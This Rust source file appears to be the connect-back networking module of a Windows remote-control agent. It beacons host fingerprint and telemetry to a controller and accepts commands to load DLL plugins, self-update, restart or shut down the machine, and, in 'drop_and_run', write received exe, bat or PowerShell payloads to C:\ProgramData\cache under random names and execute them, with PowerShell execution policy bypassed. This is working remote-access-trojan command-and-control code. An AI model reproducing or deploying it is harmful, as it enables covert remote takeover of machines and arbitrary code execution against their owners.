use std::{
    io::{self, BufRead, BufReader, ErrorKind, Write},
    net::{Shutdown, TcpStream},
    thread,
    time::Duration,
};

use crate::{plugin::Manager, sys, telemetry, text, update};

const MAX_WIRE_LINE: usize = update::MAX_UPDATE_BYTES * 4 / 3 + 1024;

enum SessionOutcome {
    Normal,
    Close,
    Update(update::PreparedUpdate),
}

pub fn run(ip: &str, port: u16) {
    run_internal(ip, port, false);
}

pub fn run_with_update_signal(ip: &str, port: u16) {
    run_internal(ip, port, true);
}

fn run_internal(ip: &str, port: u16, update_child: bool) {
    eprintln!("[DEBUG][net] phase=start update_child={} ip={} port={}", update_child, ip, port);
    let fp = telemetry::fingerprint();
    let mut plugins = Manager::new();

    loop {
        eprintln!("[DEBUG][net] phase=connect attempt");
        match TcpStream::connect((ip, port)) {
            Ok(mut stream) => {
                eprintln!("[DEBUG][net] phase=connect result=OK");
                let _ = stream.set_read_timeout(Some(Duration::from_secs(text::READ)));

                // Advertise the agent before the slower Windows telemetry probes.
                let hello_ok = send(&mut stream, &format!("{}{}", text::HELLO, fp)).is_ok();
                eprintln!("[DEBUG][net] phase=send_hello result={}", hello_ok);
                if hello_ok {
                    if update_child {
                        eprintln!("[DEBUG][net] phase=update_child_signal start");
                        if update::signal_success().is_err() {
                            eprintln!("[DEBUG][net] phase=update_child_signal result=FAIL");
                            let _ = stream.shutdown(Shutdown::Both);
                            let _ = sys::release_single();
                            return;
                        }
                        eprintln!("[DEBUG][net] phase=update_child_signal result=OK");
                    }

                    let host = telemetry::host(&fp);
                    // Keep the connection responsive during startup. The detailed
                    // Windows probes are individually bounded and are only collected
                    // for the initial DATA snapshot; the command loop must remain
                    // reachable even when a probe is slow or unavailable.
                    let ping = telemetry::ping_ms(ip);
                    let data = telemetry::record(ip, ping, &fp);
                    if send(&mut stream, &format!("{}{}", text::DATA, data)).is_ok() {
                        println!("{}", text::CONNECTED);
                        plugins.event("agent.connected", host.as_bytes());
                        match session(&mut stream, ip, port, &fp, &host, &mut plugins) {
                            SessionOutcome::Normal => {
                                plugins.clear();
                            }
                            SessionOutcome::Close => {
                                plugins.clear();
                                return;
                            }
                            SessionOutcome::Update(pending) => {
                                eprintln!("[DEBUG][net] phase=update_session result=UPDATE");
                                let _ = stream.shutdown(Shutdown::Both);
                                plugins.clear();
                                eprintln!("[DEBUG][net] phase=finish_after_disconnect start");
                                match pending.finish_after_disconnect(ip, port) {
                                    Ok(()) => {
                                        eprintln!("[DEBUG][net] phase=finish_after_disconnect result=OK");
                                        std::process::exit(0)
                                    },
                                    Err(err) => {
                                        eprintln!("[DEBUG][net] phase=finish_after_disconnect result=FAIL error={err}");
                                        eprintln!("update handoff failed: {err}");
                                    }
                                }
                            }
                        }
                    }
                }
            }
            Err(err) => { eprintln!("[DEBUG][net] phase=connect result=FAIL error={err}"); }
        }

        println!("{}", text::RETRYING);
        thread::sleep(Duration::from_secs(text::RETRY));
    }
}

fn session(
    stream: &mut TcpStream,
    ip: &str,
    port: u16,
    fp: &str,
    host: &str,
    plugins: &mut Manager,
) -> SessionOutcome {
    let Ok(clone) = stream.try_clone() else { return SessionOutcome::Normal; };
    let mut reader = BufReader::new(clone);

    loop {
        match line(&mut reader) {
            Ok(Some(value)) if value == text::HB => {
                let _ = send(stream, text::PONG);
            }
            Ok(Some(value)) if value == text::REQ => {
                let _ = send(stream, text::PONG);
                let _ = send(stream, &format!("{}{}", text::DATA, telemetry::record(ip, None, fp)));
            }
            Ok(Some(value)) if value.starts_with(text::CMD) => {
                let raw = value[text::CMD.len()..].trim();

                // CMD:REQ:DATA — telemetry refresh, same semantics as bare REQ:DATA.
                if raw.to_ascii_uppercase() == text::REQ {
                    let _ = send(stream, text::PONG);
                    let _ = send(stream, &format!("{}{}", text::DATA, telemetry::record(ip, None, fp)));
                    continue;
                }

                if raw.to_ascii_uppercase().starts_with(text::UPDATE) {
                    let rest = raw[text::UPDATE.len()..].trim();
                    let (filename, b64) = match rest.split_once(':') {
                        Some((name, data)) => (name.trim(), data.trim()),
                        None => {
                            let _ = send(stream, &format!("{}{}", text::ERR, text::UPDATE));
                            continue;
                        }
                    };
                    let Some(bytes) = update::decode_b64_update(b64) else {
                        let _ = send(stream, &format!("{}{}", text::ERR, text::UPDATE));
                        continue;
                    };
                    eprintln!("[DEBUG][net] phase=update_prepare start filename={} bytes={}", filename, bytes.len());
                    match update::prepare(ip, port, filename, &bytes) {
                        Ok(pending) => {
                            eprintln!("[DEBUG][net] phase=update_prepare result=OK target={}", pending.filename());
                            let _ = send(stream, &format!("{}{}{}", text::ACK, text::UPDATE, pending.filename()));
                            eprintln!("[DEBUG][net] phase=update_ack sent");
                            return SessionOutcome::Update(pending);
                        }
                        Err(err) => {
                            eprintln!("update prepare failed: {err}");
                            let _ = send(stream, &format!("{}{}", text::ERR, text::UPDATE));
                        }
                    }
                    continue;
                }

                // CMD:PLUGIN:<id>:<base64-dll-bytes>
                if raw.to_ascii_uppercase().starts_with(text::PLUGIN) {
                    let rest = raw[text::PLUGIN.len()..].trim();
                    // id is up to first ':'
                    let (id, b64) = match rest.split_once(':') {
                        Some((i, b)) => (i.trim(), b.trim()),
                        None => {
                            let _ = send(stream, &format!("{}{}", text::ERR, text::PLUGIN));
                            continue;
                        }
                    };
                    if id.is_empty() || b64.is_empty() {
                        let _ = send(stream, &format!("{}{}", text::ERR, text::PLUGIN));
                        continue;
                    }
                    match decode_b64(b64) {
                        Some(dll_bytes) => match plugins.load(id, &dll_bytes, host.as_bytes()) {
                            Ok(()) => {
                                let _ = send(stream, &format!("{}{}{}", text::ACK, text::PLUGIN, id));
                            }
                            Err(_) => {
                                let _ = send(stream, &format!("{}{}", text::ERR, text::PLUGIN));
                            }
                        },
                        None => {
                            let _ = send(stream, &format!("{}{}", text::ERR, text::PLUGIN));
                        }
                    }
                    continue;
                }

                if raw.to_ascii_uppercase().starts_with("UNLOAD:") {
                    let id = raw[7..].trim();
                    let ok = plugins.unload(id);
                    let _ = send(stream, &format!("{}{}{}", if ok { text::ACK } else { text::ERR }, text::PLUGOUT, id));
                    continue;
                }

                if raw.to_ascii_uppercase().starts_with(text::PEVENT) {
                    let event = raw[text::PEVENT.len()..].trim();
                    if event.is_empty() {
                        let _ = send(stream, &format!("{}{}", text::ERR, text::PEVENT));
                    } else {
                        plugins.event(event, &[]);
                        let _ = send(stream, &format!("{}{}{}", text::ACK, text::PEVENT, event));
                    }
                    continue;
                }

                if raw.to_ascii_uppercase().starts_with(text::EXECUTE) {
                    let rest = raw[text::EXECUTE.len()..].trim();
                    let (ext, b64) = match rest.split_once(':') {
                        Some((e, b)) => (e.trim(), b.trim()),
                        None => {
                            let _ = send(stream, &format!("{}{}", text::ERR, text::EXECUTE));
                            continue;
                        }
                    };
                    let ext_lc = ext.to_ascii_lowercase();
                    if !matches!(ext_lc.as_str(), "exe" | "bat" | "ps1") || b64.is_empty() {
                        let _ = send(stream, &format!("{}{}", text::ERR, text::EXECUTE));
                        continue;
                    }
                    match decode_b64(b64) {
                        Some(bytes) => match drop_and_run(&bytes, &ext_lc) {
                            Ok(()) => { let _ = send(stream, &format!("{}{}", text::ACK, text::EXECUTE)); }
                            Err(_) => { let _ = send(stream, &format!("{}{}", text::ERR, text::EXECUTE)); }
                        },
                        None => { let _ = send(stream, &format!("{}{}", text::ERR, text::EXECUTE)); }
                    }
                    continue;
                }

                let cmd = raw.to_ascii_uppercase();
                match cmd.as_str() {
                    text::RECONNECT => {
                        let _ = send(stream, &format!("{}{}", text::ACK, cmd));
                        return SessionOutcome::Normal;
                    }
                    text::CLOSE => {
                        let _ = send(stream, &format!("{}{}", text::ACK, cmd));
                        println!("{}", text::CLOSED);
                        return SessionOutcome::Close;
                    }
                    text::SLEEP | text::HIBERNATE | text::RESTART | text::SHUTDOWN => {
                        let ok = sys::command(&cmd);
                        let _ = send(stream, &format!("{}{}", if ok { text::ACK } else { text::ERR }, cmd));
                        plugins.event("agent.command", cmd.as_bytes());
                        if ok { return SessionOutcome::Close; }
                    }
                    _ => {}
                }
            }
            Ok(Some(_)) => {}
            Ok(None) => return SessionOutcome::Normal,
            Err(e) if matches!(e.kind(), ErrorKind::TimedOut | ErrorKind::WouldBlock) => {
                let _ = send(stream, text::HB);
            }
            Err(_) => return SessionOutcome::Normal,
        }
    }
}

fn drop_and_run(bytes: &[u8], ext: &str) -> std::io::Result<()> {
    use std::{fs, process::Command, time::SystemTime};

    let seed = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0)
        ^ (bytes.len() as u64).wrapping_mul(0x9e37_79b9_7f4a_7c15);
    let name = format!("{:012x}", seed & 0xffff_ffff_ffff);

    let dir = std::path::Path::new(r"C:\ProgramData\cache");
    fs::create_dir_all(dir)?;
    let path = dir.join(format!("{name}.{ext}"));
    fs::write(&path, bytes)?;

    match ext {
        "exe" => { Command::new(&path).spawn()?; }
        "bat" => { Command::new("cmd").args(["/c", path.to_str().unwrap_or("")]).spawn()?; }
        "ps1" => { Command::new("powershell").args(["-NoProfile", "-ExecutionPolicy", "Bypass", "-File", path.to_str().unwrap_or("")]).spawn()?; }
        _ => {}
    }
    Ok(())
}

fn decode_b64(s: &str) -> Option<Vec<u8>> {
    let s = s.trim();
    let mut out = Vec::with_capacity(s.len() * 3 / 4);
    let mut buf = 0u32;
    let mut bits = 0u32;
    for b in s.bytes() {
        let v = match b {
            b'A'..=b'Z' => (b - b'A') as u32,
            b'a'..=b'z' => (b - b'a' + 26) as u32,
            b'0'..=b'9' => (b - b'0' + 52) as u32,
            b'+' | b'-' => 62,
            b'/' | b'_' => 63,
            b'=' | b'\r' | b'\n' | b' ' => continue,
            _ => return None,
        };
        buf = (buf << 6) | v;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((buf >> bits) as u8);
            buf &= (1 << bits) - 1;
        }
    }
    Some(out)
}

fn line(r: &mut BufReader<TcpStream>) -> io::Result<Option<String>> {
    let mut data = Vec::with_capacity(256);
    loop {
        let chunk = r.fill_buf()?;
        if chunk.is_empty() {
            if data.is_empty() {
                return Ok(None);
            }
            return Err(io::Error::new(ErrorKind::UnexpectedEof, "unterminated command"));
        }
        if let Some(pos) = chunk.iter().position(|b| *b == b'\n') {
            if data.len() + pos > MAX_WIRE_LINE {
                return Err(io::Error::new(ErrorKind::InvalidData, "command exceeds size limit"));
            }
            data.extend_from_slice(&chunk[..pos]);
            r.consume(pos + 1);
            return String::from_utf8(data)
                .map(Some)
                .map_err(|_| io::Error::new(ErrorKind::InvalidData, "command is not UTF-8"));
        }
        if data.len() + chunk.len() > MAX_WIRE_LINE {
            return Err(io::Error::new(ErrorKind::InvalidData, "command exceeds size limit"));
        }
        data.extend_from_slice(chunk);
        let len = chunk.len();
        r.consume(len);
    }
}

fn send(stream: &mut TcpStream, s: &str) -> std::io::Result<()> {
    stream.set_write_timeout(Some(Duration::from_secs(5)))?;
    stream.write_all(s.as_bytes())?;
    stream.write_all(b"\n")
}
